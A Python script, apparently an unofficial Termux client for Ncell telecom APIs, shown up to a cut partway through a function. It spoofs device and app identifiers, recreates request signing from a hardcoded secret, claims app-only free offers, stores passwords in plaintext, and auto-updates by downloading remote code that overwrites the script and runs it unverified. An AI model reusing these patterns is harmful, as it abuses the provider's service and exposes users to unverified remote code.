#version 20220724
#change ncellapp to ncell_app 
import random
import os


rand_num=[]

def c():
    global rand_num
    while(True):
        tmp= random.randint(30,37)
        if not tmp in rand_num:
            rand_num.append(tmp)
            if len(rand_num)>7:
                rand_num=[]
            return f"\u001b[{tmp};1m";



os.system("clear");print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}nc{c()}el{c()}l m{c()}od{c()}s{c()}\n__{c()}_______{c()}________{c()}____" )


#remove update button
from datetime import datetime
from subprocess import Popen
#time=int( datetime.now().hour)
import subprocess
func_wow=""
import json 
import re
import hashlib
import requests 
import sys
import datetime
import time

#global variavle for activating the services

def run(command):
    return json.loads(subprocess.run(command,  stdout=subprocess.PIPE).stdout.decode("utf-8"))

def dialog(type,title,content):
    temp= run(["termux-dialog",type,"-t",title,"-v",content])
    code = temp["code"]
    index = temp["index"]
    return code,index 

def dialog_text(type,title,content=" "):
    temp= run(["termux-dialog","text","-t",title,type,"-i",content])
    code = temp["code"]
    text = temp["text"]
    return code,text 
offerList=[[" 1 gb data at Rs. 500😊",5002848],
        ["SMS at 13 paisa",4807917],
        ["Local cal rate 1.62",5007330],
        ["PayG 1_6M" ,5004131],
        ["2 gb Data at Rs. 50 28 days(ncell_app)",5007729],
        ["India local call",5004024],
        ["200 Min at Rs.45 7 days",5002846],
        ["5 gb 7 days at Rs 98",5006524]
        ]

hosts="https://customer.ncell.axiata.com";
current="";refresh="";phone1="";expire="";subid="";date1="aaa";date2="aaa";date3=" ";date4="";rem=0;tt=""
ff = str(datetime.datetime.now())
verpin="";
phone="";password="";otp="";id="";unit="";message="";cust_details=""; amount="";name="";session="";token="";signcode="";url="";cust_name="";sub_id="";
#some response global variable
code="";code_desc="";result="";func_wow=""


def func():
    global func_wow
    length = len(sys.argv)
    if length==2:func_wow = 123
    elif length==3:func_wow=1234 
    else:func_wow=0

func()

#auto update features here 
repo="https://raw.githubusercontent.com/Santoshkurmi/python_auto_update/master/ncell.py"

def update(repo,filename2,tempdir=".temp",dust=0):
    version1="";version2="";latest="";current="";
    address= sys.argv[0]
    filename=address[address.rfind("/")+1:]
    #print(filename)
    try:
        return_text=requests.get(repo,headers={ 'Cache-Control':'no-cache'}).text
        latest = float( return_text[:return_text.find("\n")].replace("#version","")  )
    except:
        print(f"{c()}Network request send failed,try again")
        exit()
    
    if os.path.exists(f"{filename}"):
        current=float(open(f"{filename}").readline().replace("#version",""));
    if dust==0:
        if current>=1 and latest>=1:
            if current<latest:
                time1=time.time();
                # print("\n_____________________\nUpdate is available,updating\n");
                # print(f"{c()}######################################")
                if not os.path.exists(".hehe"):
                    os.system(f"mkdir .hehe");
                if not os.system(f"cp {filename} .hehe/.{filename}_{time1}"):
                    with open(f"{filename}","w") as f:
                        f.write(return_text)
                        set_update_time()
                        # print(f"\n{c()}Please restart the program")
                        # Popen("python3 ncellpy.py",shell=True)
                        # if back_thread==0:
                        os.system(f"clear && python3 {filename}")
                        exit();
                        # else:exit()
                        

                    
                
            else:
                
                set_update_time()
        else:
            print("Something went wrong in the server")
    elif dust==1:
        
                time1=time.time();
                # print(f"{c()}######################################")
                if not os.path.exists(".hehe"):
                    os.system(f"mkdir .hehe");
                if not os.system(f"cp {filename} .hehe/.{filename}_{time1}"):
                    with open(f"{filename}","w") as f:
                        f.write(return_text)
                        set_update_time()
                        # Popen("python3 ncellpy.py",shell=True)
                        # if back_thread==0:
                        os.system(f"clear && python3 {filename}")
                        exit();
                        # else:exit()

                
import threading
            
#end of auto feature here

def check_update_time():
    if not os.path.exists(".time.txt"):
        with open(".time.txt","w") as file:
            file.write("0");
            return True
    else:
        with open(".time.txt") as file:
            time1=int(file.read());
            time2=int(time.time());
            dif=abs(time2 -time1);
            if dif >=86400:
            
                return True
            else:
                return False

def set_update_time():
    with open(".time.txt","w") as file:
        file.write(str(int(time.time())))



# back_thread=0
if func_wow==0 and check_update_time():
    update(repo,"ncellpy");
    # print("Hello baby")
    # back_thread=1
    # threading.Thread(target=update,args=(repo,"ncellpy",)).start()


###############################update code above

def getjson(key,sign=1):
    body = {

        'sms_login_otp':
        {
            "ACC_NBR":phone,
            "MSG_TYPE":"LOGIN_WITH_SMS",
        'url':"/api/login/sendMsgCode"
        },

        'password_login':
        {
            "ACC_NBR":phone,
            "LOGIN_CODE": password,
            "MSG_TYPE": "SMS",
            "IS_COOKIE_PWD": "N",
            "CUST_TYPE": "S",
            'url':"/api/login/loginWithSmsOrPWD"
        },

        'query_balance':
        {
            '':'',
            'url':"/api/billing/queryAcctBal"
        },

        'query_usage_detail':
        {
            "PREFIX":"977",
            'url':"/api/billing/qryUsageDetail"
        },#for listing the all activated data pack sending

        'send_register_otp':
        {
            "ACC_NBR":phone,
            "MSG_TYPE":"REGISTER",
            'url':"/api/login/sendMsgCode"
        },

        'register':
        {
            "ACC_NBR":phone,
            "PWD":password,
            "VER_CODE":otp,
            "MSG_TYPE":"REGISTER",
            'url':"/api/login/register"
        },

        'send_reset_password_otp':
        {
            "ACC_NBR":phone,
            "MSG_TYPE":"FORGET_PWD",
            'url':"/api/login/sendMsgCode"
        },

        'reset_password':
        {
            "NEW_PWD":password,
            "ACC_NBR":phone,
            "VER_CODE":otp,
            "MSG_TYPE":"FORGET_PWD",
            'url':"/api/login/resetPwd"
        },

        'send_balance_transfer_otp':
        {
            "MSG_TYPE":"VALIDATE_BAL_TRANSFER_CODE",
            'url':"/api/login/sendMsgCode"
        },

        'send_balance':
        {
            "Operation":1,
            "ACCT_RES_CODE":id,
            "DMSISDN":phone,
            "AMOUNT":amount,
            "VER_CODE":otp,
            "UNIT":unit,
            'url':"/api/billing/balTransfer"
        },

        'count_msg':
        {
            '':'',
            'url':"/api/system/sendSMSRestCount"
        },

        'send_message':
        {
            "ACC_NBR":phone,
            "MSG":message,
            "SEND_TIME":"" ,
            'url':"/api/system/sendSMS"
        },

        'get_activated_services':
        {
            '':'',
            'url':'/api/subs/qrySubsVasInfo'
        },#get offer id of activated pack

        'activate_service':
        {
            "MOD_TYPE":"final",
            "IS_ORDER": "1",
            "OFFER_ID":id,
            'url':"/api/subs/orderOrRemoveOrderVas"
        },
        'deactivate_service':
        {
            "MOD_TYPE":"final",
            "IS_ORDER":"0",
            "OFFER_ID": id,
            "FAMILY_PLAN_FLAG":"N",
            'url':"/api/subs/orderOrRemoveOrderVas"
        },

        'change_plan':
        {
            "NEW_SUBS_PLAN_ID":id,
            "MOD_TYPE": "FINAL",
            'url':"/api/subs/modifySubsPlan"
        },

        'get_all_details':
        {
            "QRY_INDEP_PROD":True,
            "QRY_USED_RES":True,
            "INCLUDE_TERMINATION":True,
            'url':"/api/subs/qryMySubscriber"
        },#pin,puk,certificate details etc

        'deactivate_sim':
        {
            "ORDER_REASON_ID":2,
            "ORDER_REASON":"I lost my simcard.I will resume after I found it",
            'url':"/api/subs/simCardLost"
        },

        'activate_sim':
        {
            "ORDER_REASON_ID":3,
            "ORDER_REASON":"I found my simcard."  ,
            'url':"/api/subs/simCardRestore"
        },

        'get_pin_iccid':
        {
            "SIM_CARD_ID":id,
            'url':"/api/resource/qrySimCardDetail"
        },
        'cap': {
         "ACC_NBR": phone,
         "url":"/api/login/showOrHideValidateBox"

         },

        'headers':
        {
            "url":"allu","TOKEN-ID":token,"SESSION-ID":session,'signcode':signcode,"User-Agent":"Mozilla/5.0","Content-Type":"application/json;charset=UTF-8"
        },
        "verpin_send":
        {
            "ACC_NBR":phone,
            "url":"/api/login/showOrHideValidateBox"
        },
        "verpin_login":
        {
            "ACC_NBR":phone,
            "LOGIN_CODE":password,
            "MSG_TYPE":"SMS",
            "IS_COOKIE_PWD":"N",
            "VALIDATE_BOX_STATUS":True,
            "INPUT_VER_CODE":verpin,
            "CUST_TYPE":"S",
            "url":"/api/login/loginWithSmsOrPWD"
        }

    } 
    sign and getSigncode(body[key]);
    return body[key];

#for getting signcode of the body
def getSigncode(tempBody):
    global signcode,url
    url=tempBody["url"];
    del tempBody["url"];
    tempBody=re.sub("[\W_]","",json.dumps(tempBody));
    signcode=hashlib.sha256( (session + url + tempBody + token + "16BytesString").encode("utf-8")  ).hexdigest()

#looper here


#sending the request here

def send(key):
    global code,result,code_desc,verpin
    body=getjson(key);
    
    headers=getjson("headers",0);
    try:
        response=requests.post(hosts+url,data=json.dumps(body),headers=headers).json()
        code=int(response["resultCode"]);
        code_desc=response["resultDesc"];
    except:
        print("Please connect with internet");
        return "failed";
    if code==0:
        code=True;
        try:
            if key=="verpin_send":
                verpin = response["verCode"];
                
            result = response["result"];
        except:
            pass;
    else: code=False;print(f"\n{c()}{code_desc}\n") #failed msg shown here
    

#for taking input  
def take(msg):
    global Test
    text=""
    while text=="":
        try:
            text = input(f"{c()}{msg}")
            
            if text=="e":os.system('clear');exit();
            elif  text=="b":Test=False
            
        except Exception as e:
            print()
    return text;

################################################################################




#for reading and writing of json file
if not os.path.exists("cust_details.json"):
            with open("cust_details.json","w") as file:
                file.write('{"login_web":{}, "login_app":{} ,"current_web":"","current_app":{} }');


def readwrite(operation,key="",app=0):
    
    global session,token,phone,cust_name,sub_id,cust_details,result,password,name;
    if operation=="write" and not app:
        
        session=result['SESSION-ID'];
        token=result['TOKEN_ID'];
        sub_id=result["SUBS_ID"];
        cust_name=result["CUST_NAME"];
        phone=result["ACC_NBR"];
        
        with open("cust_details.json") as file:
                cust_details=json.load(file);
                cust_details['login_web'][phone]={"name":cust_name,"phone":phone,"password":password,"sub_id":sub_id,"session":session,"token":token}
                cust_details['current_web']={"name":cust_name,"phone":phone,"password":password,"sub_id":sub_id,"session":session,"token":token}

        with open("cust_details.json","w") as file:
                file.write(json.dumps(cust_details,indent=4));
    if operation=="write" and app:
        global current,refresh,expire,subid;
        cust_details['login_app'][phone]={"phone":phone,"current":current,"refresh":refresh,"expire":expire,"subid":subid,"name":name}
        cust_details['current_app']={"phone":phone,"current":current,"refresh":refresh,"expire":expire,"subid":subid,"name":name}
        with open("cust_details.json","w") as file:
                file.write(json.dumps(cust_details,indent=4));

    if operation=="read" :
        with open("cust_details.json") as file:
                cust_details=json.load(file);
                return cust_details

    if operation=="delete" and not app:
        readwrite("read");
        del cust_details["login_web"][key];
        with open("cust_details.json","w") as file:
                file.write(json.dumps(cust_details,indent=4));
    if operation=="delete" and  app:
        readwrite("read");
        del cust_details["login_app"][key];
        with open("cust_details.json","w") as file:
                file.write(json.dumps(cust_details,indent=4));
    if operation=="update":
        readwrite("read");
        try:
            session=cust_details["current_web"]["session"];
            token=cust_details["current_web"]["token"];
            phone=cust_details["current_web"]["phone"]
            password=cust_details["current_web"]["password"]

        except:
            print("\nPlease login with some account\n")
    if operation=="custom_update":
        readwrite("read");
        session=cust_details["login_web"][key]["session"];
        token=cust_details["login_web"][key]["token"];
        password=cust_details["login_web"][key]["password"]
        phone=key;
        cust_details["current_web"]=cust_details["login_web"][key];
        with open("cust_details.json","w") as file:
            file.write(json.dumps(cust_details,indent=4));
        
    if operation=="custom_app":
        cust_details["current_app"]=cust_details["login_app"][key];
        with open("cust_details.json","w") as file:
            file.write(json.dumps(cust_details,indent=4));


        



#printing the all login things
def accounts(app=0):
    account=[];
    readwrite("read")
    if not app:
        text="web"
    else:
        text="app"
    web=cust_details[f'login_{text}']
    print("\n*************************\n")
    try:
        current=cust_details[f"current_{text}"]["phone"];
    except:
        print(f"{c()}There are no any account here");
        print("************************\n")
        return
    status=""
    i=1;
    name=[]
    for e in web:
        if e==current:
            status="##"
        print(f"{c()}{i}. {e} {web[e]['name']} {status}")
        name.append(web[e]['name'] + " " + status)  
        status=""
        account.append(e);
        i+=1;
    print(f"\n{c()}*************************\n")
    try:
        len(account)
    except:
        account.append(0);
        name.append(" ")
    if app==0:
        return account
    return account,name;
    

                


#test whether it is successfully logined or not
def logintest():
    global session,token;
    send("get_all_details");
    
       
    if not code:
            session=""
            token=""
            query =input(f"{c()}\nWant to login ___"+phone+"___(y|n):").lower()
            if query=="y":
                send("password_login");
            
            if code:
                readwrite("write");
                print(f"\n{c()}Welcome {cust_name} @ {phone}\n")

                
    else:
            print(f'\n{c()}Welcome {result["SUBS"]["SUBS_CUST"]["CUST_NAME"]} || {phone}');  

#for login 


def loginaccount():
    global phone,otp,password,result,session,token,code,verpin;
    account=accounts();
    
    phone=take("Enter the number: ")
    if phone=="b":return;
    tempPhone=phone;
    if phone[-1:]=="-":
        phone = phone.replace("-","")
        readwrite("delete",account[int(phone)-1],0)
        print(f"{c()}Account is removed successfully")
        loginaccount();
        return
    if len(phone)==1 or len(phone)==2:
        readwrite("custom_update",account[int(phone)-1]);
        logintest();
        return 
           
        
    code=0;
    while(not code):
        if len(tempPhone)>=10:
            phone= re.sub("[\W_]","",phone)[-10:]
            password=take("Enter password(o): ")
            if password=="b":return;
            elif password=="o":
                send("sms_login_otp");
                if code:
                    code=0;
                    while(not code):
                        password=take("Enter the otp: ")
                        if password=="b":return;
                        session=""
                        token=""
                        
                        send("password_login");
                        
                        if code:
                            readwrite("write");
                            print(f"\n{c()}Welcome {cust_name} || {phone}\n")
                        
                        
            elif len(password)>3:
                session=""
                token=""
                send("password_login");
                

                if code:
                    readwrite("write");
                    print(f"\n{c()}Welcome {cust_name} || {phone}\n")   

                elif code_desc=="Verification code error.":
                            send("verpin_send");
                            if code:
                                send("verpin_login");
                                if code:
                                    readwrite("write");
                                    print(f"\n{c()}Welcome {cust_name} || {phone}\n")
   

    
#making other function needed for it too

def checkData(operation=0):
    send("query_usage_detail");
    idd=""
    if code:
        print("\n****************************")
        i=2;
        result1=result;
        send("query_balance");
        if code:
            balance=result["LOCAL_BAL"]
            #print(result)
        print("\n1. Main Balance: "+str(balance))
        idd=[["",""],["Local Currency","Rs."]];
        for e in result1:
            for f in result1[e]:
                print(f"\n{i}.")
                print(f"{c()}Type: {f['ACCT_RES_NAME']}")
                print(f"Amount: {f['REAL_BAL']}/{f['GROSS_BAL']} {f['UNIT_NAME']}")
                print(f"Expire: {f['EXP_DATE']}")
                i+=1;
                idd.append([f["ACCT_RES_ID"],f["UNIT_NAME"] ])
    print("****************************\n")
    if operation==0:input();os.system("clear")
    return idd;

def signup():
    global phone,password,otp;
    phone=take("\nEnter the phone: ");
    if phone=="b":return;
    if len(phone)>=10:
        phone= re.sub("[\W_]","",phone)[-10:]
        password=take("Enter the new password: ");
        if password=="b":return;
        send("send_register_otp");
        if code:
            otp=take("Enter the otp: ");
            if otp=="b":return;
            send("register");
            if code:
                print("\nSuccessfull in creation of account\n");
                session=""
                token=""
                send("password_login");
                if code:
                    readwrite("write");
                    print(f"\n{c()}Welcome {cust_name} || {phone}\n")

    else:
        print(f"\n{c()}Please input correct phone number\n");



def forgot():
    global phone,password,otp;
    phone=take("\nEnter the phone: ");
    if phone=="b":return;
    if len(phone)>=10:
        phone= re.sub("[\W_]","",phone)[-10:]
    else:
        print("\nPlease enter correct phone number\n");
    password=take("Enter the new password: ");
    if len(password)>4:
        send("send_reset_password_otp");
        if code:
            otp=take("Enter the otp: ");
            if otp=="b":return;
            send("reset_password");
            if code:print("\nPassword is resetted successfully\n");
    

    
    


def transfer():
    global id,otp,phone,unit,amount;

    idd=checkData(1);
    text=take("Choose the type of transfer: ");
    if text=="b":return;
    if int(text)>len(idd):print("Please enter the correct option")
    else:
        id,unit=idd[int(text)];
        
        phone=take("Enter the receiver number: ");
        if phone=="b":return;
        if len(phone)>=10:
            amount=take("Enter the amount: ");
            if amount=="b":return;
            phone= re.sub("[\W_]","",phone)[-10:]
            send("send_balance_transfer_otp");
            if code:
                otp=take("Enter the otp: ");
                if otp=="b":return;
                send("send_balance");
                if code:print("\nBalance is transferred successfully\n")

        else:
            print("Please enter correct phone number");
        

        

    


def sendMessage():
    global phone,message;
    
    phone=take("\nEnter the phone number: ");
    if phone=="b":return
    if len(phone)>=10:
        phone= re.sub("[\W_]","",phone)[-10:]
        while(True):
            send("count_msg");
            count=result;
            message=take(f"({count})=> ");
            if message=="b":return;
            send("send_message");
            

    
    else:print("Please input correct number")


def deactivate_service():
        global id;
    
        send("get_activated_services");
        i=1;
        offerid=[""];
        for e in result:
            print(f"\n{c()}{i}. Type: {e['OFFER_NAME']}");
            print(f"EFF: {e['EFF_DATE']}");
            print(f"EXP: {e['EXP_DATE']}");
            print(f"Offer Id: {e['OFFER_ID']}\n");
            i+=1;
            offerid.append(e['OFFER_ID']);
        choose=take("Enter the offer to deactivate: ");
        if choose=="b":return;
        if int(choose)<=len(offerid):
            id=offerid[int(choose)]
            send("deactivate_service");
            if code:print("\nSuccessfully deactivated\n")

def activate_service():
        global id,offerList;
        print()
        for i in range(len(offerList)):
            print(f"{i+1}. {offerList[i][0]}");
        
        choose=take("\nEnter the offer to activate: ");
        if choose=="b":return;
        if int(choose)<=len(offerList):
            id=offerList[int(choose)-1][1];
            send("activate_service");
            if code:print("\nService activated successfully\n");
        else:
            id=choose;
            send("activate_service");
            if code:print("\nService activated successfully\n");
##


def changeSimPlan():
    global id;
    print()
    offerList=[["Sajilo SLC",1122],["Sajilo Bonus Plus",1109],["Sajilo Sajilo",1028],["Sajilo Happy data",4999726],["Sajilo Bonus pack",1118]]
    for i in range(len(offerList)):
            print(f"{i+1}. {offerList[i][0]}");
        
    choose=take("\nEnter the plan: ");
    if choose=="b":return;
    if int(choose)<=len(offerList):
            id=offerList[int(choose)-1][1];
            send("change_plan");
            if code:print("\nService activated successfully\n");
    else:
            id=choose;
            send("change_plan");
            if code:print("\nService activated successfully\n");

#

#

def checkPin():
    send("get_all_details");
    if code:
        
        more=result['SUBS']["USED_RES_EX_LIST"];
        print(f"\n{c()}1. CUST_NAME: {result['SUBS']['SUBS_CUST']['CUST_NAME']}")
        print(f"{c()}2. BIRTHDAY_DATE: {result['SUBS']['SUBS_CUST']['BIRTHDAY_DAY']}")
        print(f"{c()}3. GENDER: {result['SUBS']['SUBS_CUST']['GENDER']}")
        print(f"{c()}4. CREATED_DATE: {result['SUBS']['SUBS_CUST']['CREATED_DATE']}")
        print(f"{c()}5. CERT_ID: {result['SUBS']['SUBS_CUST']['CERT_ID']}")
        print(f"{c()}6. SUBS_PLAN: {result['SUBS']['SUBS_BASE_DETAIL']['SUBS_PLAN_NAME']}")
        print(f"{c()}7. IMEI: {result['SUBS']['SUBS_BASE_DETAIL']['PROD_ATTR_VALUE_EX_LIST'][3]['VALUE']}")
        print(f"{c()}8. IMEI_UPDATE: {result['SUBS']['SUBS_BASE_DETAIL']['PROD_ATTR_VALUE_EX_LIST'][3]['UPDATE_DATE']}")
        print(f"{c()}9. SUBS_ID: {result['SUBS']['SUBS_BASE_DETAIL']['SUBS_ID']}")
        for i in range(len(more)):
            print(f"{c()}{i+9}. {more[i]['RES_TYPE_NAME']}: {more[i]['RES_NBR']}")
        input();os.system("clear")
   

def blockSim():
    global id;
    print(f"{c()}\n1. Activate Simcard\n2. Deactivate Simcard")
    choose=take("=>")
    if choose=="1":
        send("activate_sim");
        if code:print("\nSimcard is successfully activated\n")
    elif choose=="2":
        send("deactivate_sim")
        if code:print("\nSimcard is successfully deactivated\n")

def checkFromIccid():
    global id;
    id=take(f"\n{c()}Enter the sim iccid: ");
    if id=="b":return;
    else:
        send("get_pin_iccid")
        if code:
            print(f"\n{c()}1. PIN1: {result['PIN1']}")
            print(f"{c()}2. PIN2: {result['PIN2']}")
            print(f"{c()}3. PUK1: {result['PUK1']}")
            print(f"{c()}4. PUK2: {result['PUK2']}\n")
        

#######################################
#for listing all the functions and description for choosing the input

fun_list=[
["Check data",checkData],["Login",loginaccount],    ["Signup",signup],  ["Forgot",forgot],
["Transfer Amount",transfer],   ["Send free message",sendMessage],
["Activate Services",activate_service], ["Deactivate Services",deactivate_service],
["Change SIM plan",changeSimPlan],  ["Check pin/puk",checkPin],
["Block simcard",blockSim],     ["Get pin/puk using iccid",checkFromIccid],
];

######################################
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

host="https://sca.ncell.axiata.com/adl/et/telco/selfcare/ncell/api/v1.0/"
Headers={"accept":"application/json,text/plain,*/*","Content-Type":"application/json","Host":"sca.ncell.axiata.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/3.12.6",}
print("\n")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



# reading all the array of the file
def read(): 

    return readwrite("read")["current_app"];




# writing into the file

def write(phonep=phone,currentp=current,refreshp=refresh,expirep=expire,sub=subid):
    global phone,current,refresh,expire,subid;
    try:
        
        phone=phonep;
        current=currentp;
        refresh=refreshp;
        expire=expirep;   
        subid=sub;
        readwrite("write","",1);
    except:
        pass



#making a json accpeter

def jsonHero(key,value):
    halfBody={ "requestHeader": {
             "requestId": "1631971107741NCELL8546",
             "timestamp": "2021-09-18T13:18:27.741Z",
             "channel": "sca",
             "deviceType": "android",
             "deviceId": "200280b19915cb7d",
             "clientip": "N/A",
             "action": "PROFILE",
             "connectionType": "wifi",
             "msisdn": phone,
             "deviceModel": "Iphone 11 pro max",
             "location": "83.3649542,27.9834468",
             "primaryMsisdn": phone,
             "languageCode": "1",
             "appVersion": "4.0.0.4"
           }
    }
    halfBody[key]=value;
    return halfBody;





#defining the post request


def post(url,keyValue):
    global Headers,host,current;
    url1=host + url;
    
    Headers["authorization"]="Bearer "+current;
    
    body=jsonHero(keyValue["0"],keyValue["1"])
    body=json.dumps(body);
    try:
        response=requests.post(url1,data=body,headers=Headers);
    except Exception as e:
        print("Network request send failed..exiting");
        if func_wow==123:
            os.system("../usr/bin/termux-notification  -t 'Network request send failed😓' -c '\n\n😵😭😭' --id 1234")
            os.system("am broadcast -a com.jozein.xedgepro.PERFORM -e data 6402")
        exit()
    code=response.status_code;
    
    jsonstr=response.json()
   # printing all the output here
   
   # print(jsonstr)
    
    
    desc=jsonstr["responseHeader"]["responseDesc"];
    if desc=="Access token is expired" :
        url1=url
        key=keyValue
        refreshToken();
        print(bcolors.FAIL+"Refreshing of token...")
        
        wow=post(url1,key);
    
        
        return wow;
      
    if desc=="Full authentication is required to access this resource":
        if func_wow==123:
            
            os.system("../usr/bin/termux-notification --button1 Refresh --button2 Accounts --button1-action 'termux-notification-remove 12345;termux-notification-remove 1234; ncell1' --button3-action 'termux-notification-remove 12345' --button3 Close --button2-action 'ncell2'  --image /sdcard/termux.png --id 12345 -t 'Access Token Invalid' -c 'Please login again or choose other account'")
            os.system("am broadcast -a com.jozein.xedgepro.PERFORM -e data 6402")
            exit()  

        # url1=url
        # key=keyValue
        # login();
        # wow=post(url1,key);
        # return wow;
        
    
    

    print(bcolors.HEADER+desc)
    return code,desc,jsonstr;
   
  


#defining the input taker
def takeInput(text=""):
    inp=""
    try:
        inp=input(bcolors.OKCYAN+text+bcolors.OKGREEN);
    except:print(bcolors.HEADER+"Thank you!");exit();
    return inp;





#definign the startup
def start():
    global current,phone,refresh,expire,subid,name;
    
    try:
        ret=read();
       # print(ret)
        current=ret["current"]
        phone=ret["phone"]
        refresh=ret["refresh"]
        expire=ret["expire"]
        subid=ret["subid"];
        name = ret["name"]
    except: print("Something get wrong here");





#gettting profile info
def profile():
    global name;
    global subid
    url="subscriber/profile/query"
    value={
            "0":"querySubscriberProfileRequest",
            "1": {
                "msisdn":phone,
                "languageCode": "1",
                }
         }
         
    response=post(url,value)    
    
    try:
            name=response[2]["querySubscriberProfileResponse"]["subscriberDetail"]["firstName"];
            print(bcolors.OKBLUE+"Hello "+ response[2]["querySubscriberProfileResponse"]["subscriberDetail"]["firstName"]+" || "+str(phone));
            
            subid=response[2]["querySubscriberProfileResponse"]["subscriberDetail"]["subscriberId"];
            write(phonep=phone,currentp=current,refreshp=refresh,expirep=expire,sub=subid);
                
            print("Subscriber id: "+subid)
            
    except: print(bcolors.BOLD+"Please login here...");

    print(bcolors.WARNING+"*******************");



#login setup

def login():

    global current,phone,refresh,expire,func_wow,name
    try:
        account,name1=accounts(1);
    except :
        account=[""]
        name1=[""]
        pass
    
    ph="1.Enter the number😵,"
    c=""
    for i in range(1,len(account)+1):
        c=i
        ph += str(i+1)+". "+account[i-1] +" "+ name1[i-1]+","
    ph+=str(c+2)+". Iron Man is dead😭"
    if func_wow==1234:
        #ph= ",".join(account)
        os.system("su -c cmd statusbar collapse")
        out= run(["termux-dialog","spinner","-t","Choose the number😊","-v",ph])
        
        if out["code"]==-1:
            start()
            tmp =phone
            if not out['index']in [0,len(account)+1]:
                phone=account[out['index']-1]
                name = name1[out['index']-1]
                if tmp==phone:print("3sh");return
                readwrite("custom_app",phone)
                start()
                #profile()
                func_wow=123
                app()
            elif out["index"]==0:
                code,phone1=dialog_text("-m","Enter the phone number🥰","Enter number here")
                phone1 =str(phone1)
                if code==-1:
                    # print(phone1)

                    ###################################
                    if not len(phone1)>=10:dialog("spinner","The phone number is not correct😭","Please try again");exit()
                    phone1= re.sub("[\W_]","",phone1)[-10:]
                    phone = phone1
                    body={"0":"generateOTPRequest",
                        "1":{
                        "msisdn":phone1,
                        "deviceId": "200280b19915cb7d",
                        "action": "LOGIN"
                        }
                             }
                    response=post("user/otp/generate",body);

                    if response[0]==200:
                        code,otp=dialog_text("-m","Enter the otp😵","Enter otp here")
                        if not code==-1:code,otp=dialog_text("-m",phone1,"Enter otp here")
                        if otp=="b":return
                        elif otp=="e":exit()
                        if len(otp)>4:
                            body={
                            "0":"validateOTPRequest","1": {
                            "msisdn":phone1,
                            "deviceId": "200280b19915cb7d",
                            "otpDetail":{"action":"LOGIN","otp":otp}
                            }
                            }
                            response=post("user/otp/validate",body);
                            dialog("spinner",response[1],"")
                            if response[0]==200:
                                try:
                                    current=response[2]["validateOTPResponse"]["accessToken"]
                                    refresh=response[2]["validateOTPResponse"]["refreshToken"]
                                    expire=response[2]["validateOTPResponse"]["expiresIn"]
                                    profile();
                                except:print("Something went wrong here ....")
                        if not code==-1:exit()

            else:
                subuns()           
#################################


        return

       
    
    phone1=takeInput(bcolors.OKBLUE+"Enter number: ");
    if phone1=="b":return
    elif phone1=="e":exit()
    if phone1[-1:]=="-":
        phone1 = phone1.replace("-","")
        readwrite("delete",account[int(phone1)-1],1)
        print(bcolors.FAIL+"\nAccount is removed successfully\n")
        login();
        return
    try:
        length=len(account)
    except:length=-1
    if len(phone1)<=5:
        phone=account[int(phone1)-1]
        readwrite("custom_app",phone);
        start()
        profile()
#do something here
        return
    else:
            if not len(phone1)>=10:print("Wrong phone1 number..");return
            phone1= re.sub("[\W_]","",phone1)[-10:]
            phone = phone1
    body={"0":"generateOTPRequest",
        "1":{
            "msisdn":phone1,
            "deviceId": "200280b19915cb7d",
            "action": "LOGIN"
            }
    }
    response=post("user/otp/generate",body);

    if response[0]==200:
        otp=takeInput(bcolors.WARNING+"Enter the otp: ");
        if otp=="b":return
        elif otp=="e":exit()
        if len(otp)>4:
            body={
             "0":"validateOTPRequest","1": {
             "msisdn":phone1,
             "deviceId": "200280b19915cb7d",
             "otpDetail":{"action":"LOGIN","otp":otp}
             }
            }
            response=post("user/otp/validate",body);
            
            if response[0]==200:
                try:
                    current=response[2]["validateOTPResponse"]["accessToken"]
                    refresh=response[2]["validateOTPResponse"]["refreshToken"]
                    expire=response[2]["validateOTPResponse"]["expiresIn"]
                    profile();
                except:print("Something went wrong here ....")
                




#sending msg 
def sendsms():
    global phone
    # sender=takeInput(bcolors.FAIL+"Enter the sender number(m): ");
    receiver=takeInput(bcolors.ENDC+"Enter the receiver number(m): ");
    sender=phone
    receiver = re.sub("[\W_]","",receiver)[-10:]

    # if sender=="m":sender=phone
    # if receiver=="m":receiver=phone
    msg="1";
    while msg!="-1" and len(sender)>6 and len(receiver)>6:
    
        try:
            msg=input(bcolors.BOLD+"\n=> ");
        except:print("Thanks you");break;
        if msg=="b" or msg=="":break;
        if msg=="e":exit()
        body={
             "0":"sendSMSFreeRequest","1": {
             "source":sender,
             "destination": receiver,
             "content":msg,
             "schedule":None,
             "isConfirm":0
    
             }
        }

        response=post("smsmgt/free/sms/send",body);
        try:
            if response[2]["sendFreeSMSResponse"]['statusCode']=='0':
            
                print(bcolors.WARNING+"Message send successfully");
        
            else: print("Message not sent!");
        except:print("Message not sent!")





#subscriber the package

def subuns(action=""):
    code=[5005024,5002848,5007729,5002846];
    if not func_wow==1234:
        offer=takeInput(bcolors.WARNING+"1. 400 mb free data\n2. 1 gb free data\n3. 2gb at Rs.50 28 days\n4. 200 Min at Rs.45 7 days\n=> ");
        if offer=="b":return
        elif offer=="e":exit()
        if offer!="":
        
            if offer=="2":
                print("Service Not Available");
                return
            if offer=="fd":
                offer="2"
            if offer in ["1","2","3"]:
                offer=code[int(offer)-1];
            
        else: exit();
    elif func_wow==1234:
        code1,text=dialog_text("-p","Enter the password😔 ||"+phone,"Give your password")
        if not code1==-1:exit()
        if text=="skyisblue123":
            offer="2"
            if offer in ["1","2","3"]:
                offer=code[int(offer)-1];
        else: dialog("spinner","Wrong password"," ");exit()

        # offer=="2"
    body={"0":"productSubscriptionSummaryRequest","1":{"deviceId":"200280b19915cb7d","msisdn":phone,"subscriptionCode":offer,"productName":"FREE 200MB : App only offer","productPrice":"0.00","ncellProductName":"FREE 200MB_SCA","medium":"APP","linkId":"00000000000000000"}}
    response=post("billingmgt/product/"+action+"subscribe",body);
    if func_wow==1234:
        dialog("spinner",response[1]+"😱","Don't be much selfish😵")



#send gift
def giftSend():
    global phone
    codeArray=queryGift();
    gift=takeInput(bcolors.HEADER+"Enter the choice to perform: ");
    if gift=="b":return
